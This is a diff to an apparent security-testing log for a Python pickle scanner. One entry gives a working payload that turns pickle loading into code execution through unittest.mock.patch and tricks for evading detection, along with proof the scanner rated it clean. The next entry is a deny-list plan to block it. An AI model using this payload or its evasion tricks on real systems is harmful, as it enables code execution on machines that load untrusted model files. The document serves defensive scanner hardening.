@@ -2224,3 +2224,126 @@ Blocking plan:
 Performance note: the fix adds static policy entries checked by binary search.
 It does not add filesystem simulation, import graph modeling, or cross-literal
 string reconstruction for fragmented import statements.
+
+## Turn 51 - `unittest.mock.patch` start-time import gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using `unittest.mock.patch()`
+to import an attacker-written module when the patcher starts.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_unittest_mock_patch_marker")
+module_path = Path.cwd() / "ma_unittest_mock_patch_exec.py"
+module_name = module_path.stem
+content_parts = [
+    "im",
+    "port pathlib; pathlib.Path(",
+    repr(str(marker)),
+    ").touch()\nsomeattr = 1\n",
+]
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in module_path.parts),
+        b"tR\x940",
+        sg("builtins", "str.join"),
+        b"(",
+        s(""),
+        b"(",
+        *(s(part) for part in content_parts),
+        b"ttR\x940",
+        sg("pathlib", "Path.write_text"),
+        b"(h\x00h\x01tR0",
+        sg("unittest.mock", "patch"),
+        b"(",
+        s(f"{module_name}.someattr"),
+        b"K\x02tR\x940",
+        sg("unittest.mock", "_patch.start"),
+        b"h\x02\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=381`, `bytes_total=381`, `opcode_count=58`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `pathlib.PosixPath`, `builtins.str.join`,
+  `pathlib.Path.write_text`, `unittest.mock.patch`, and
+  `unittest.mock._patch.start`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final
+  `unittest.mock._patch.start(patcher)` call writes
+  `ma_unittest_mock_patch_exec.py` into the current importable working
+  directory but does not create `/tmp/ma_unittest_mock_patch_marker`
+- Unpickle result: the full payload writes the module, constructs
+  `patch("ma_unittest_mock_patch_exec.someattr", 2)`, starts the patcher,
+  creates `/tmp/ma_unittest_mock_patch_marker`, and returns `2`
+- RCE mechanism: `patch()` stores a dotted target string without importing it.
+  `_patch.start()` enters the patcher, imports the target module to resolve the
+  attribute, and therefore executes attacker-controlled top-level Python during
+  deserialization.
+
+Why the scanner missed it:
+
+- The prior `unittest.mock` block covered `Mock` and `MagicMock` callable
+  proxies only; `unittest.mock.patch` and `unittest.mock._patch.start` are
+  absent from `DANGEROUS_GLOBALS`.
+- `unittest.mock` is still absent from `DANGEROUS_WILDCARD_MODULES`.
+- The payload uses only currently clean globals: `pathlib.PosixPath`,
+  `builtins.str.join`, `pathlib.Path.write_text`, `unittest.mock.patch`, and
+  `unittest.mock._patch.start`.
+- The imported module's executable line is assembled from `"im"` and
+  `"port pathlib; ..."` fragments at unpickle time. No single pickle string
+  literal contains an `import` statement, so the suspicious-string heuristic
+  does not fire.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is another file-mediated import-execution sink, this
+time through mock patch target resolution rather than test discovery. The
+focused next block should add sorted `DANGEROUS_GLOBALS` entries for
+`("unittest.mock", "patch")`, `("unittest.mock", "patch.dict")`,
+`("unittest.mock", "patch.multiple")`, and
+`("unittest.mock", "_patch.start")`, plus a manual-pickle oracle regression
+for the start-time import proof. The hot path remains static policy lookup.
+
+## Turn 52 - Block `unittest.mock.patch` target imports
+
+Blocking plan:
+
+- Add sorted `DANGEROUS_GLOBALS` entries for `unittest.mock.patch`,
+  `unittest.mock.patch.dict`, and `unittest.mock.patch.multiple`. These
+  constructors can carry attacker-selected dotted targets that are imported
+  when the patcher is entered.
+- Add `unittest.mock._patch.start` and `unittest.mock._patch.__enter__` because
+  those are the patcher entry points that resolve/import the target.
+- Add portable policy coverage for raw reductions of all five symbols so
+  detection does not depend on a particular importable module layout.
+- Add a CPython oracle regression that first proves the fragmented
+  `Path.write_text()` payload only writes the module file, then makes the
+  `tmp_path` importable and proves adding `_patch.start(patcher)` imports that
+  module and creates the marker during `pickle.loads()`.
+
+Performance note: the fix adds static policy entries checked by binary search.
+It does not add import graph modeling, patcher state tracking, or cross-literal
+string reconstruction for fragmented import statements.
